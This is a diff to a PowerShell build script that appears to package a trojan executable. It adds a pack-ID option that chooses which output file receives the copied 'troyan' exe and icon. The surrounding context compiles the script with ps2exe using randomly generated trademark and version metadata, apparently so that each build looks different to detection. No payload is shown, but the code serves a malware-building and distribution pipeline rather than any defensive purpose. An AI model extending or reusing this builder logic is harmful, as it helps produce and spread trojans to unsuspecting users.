@@ -1,5 +1,5 @@
 param (
-    [string]$serverName
+    [string]$serverName, [string]$packId = ""
 )
 if ([string]::IsNullOrEmpty($serverName)) {
         throw "-serverName argument is null"
@@ -45,5 +45,18 @@ Invoke-ps2exe `
     -trademark (Get-RandomString) `
     -version (Get-RandomVersion)
 
+$outputFile = $server.userTroyanExe    
+ 
+if ([string]::IsNullOrEmpty($packId) -eq $false) {
+    $pack = $server.pack.items | Where-Object { $_.index -eq $packId }
+    if (-not $pack) {
+        throw "Item with index '$packId' not found in pack items."
+    }
+    $outputFile= $pack.packFileExe
+}   
+
+Write-Host "Output exe: $outputFile"
+
 Copy-Item -Path $server.troyanIco -Destination $server.userTroyanIco -Force
-Copy-Item -Path $server.troyanExe -Destination $server.userTroyanExe -Force
+Copy-Item -Path $server.troyanExe -Destination $outputFile -Force
+
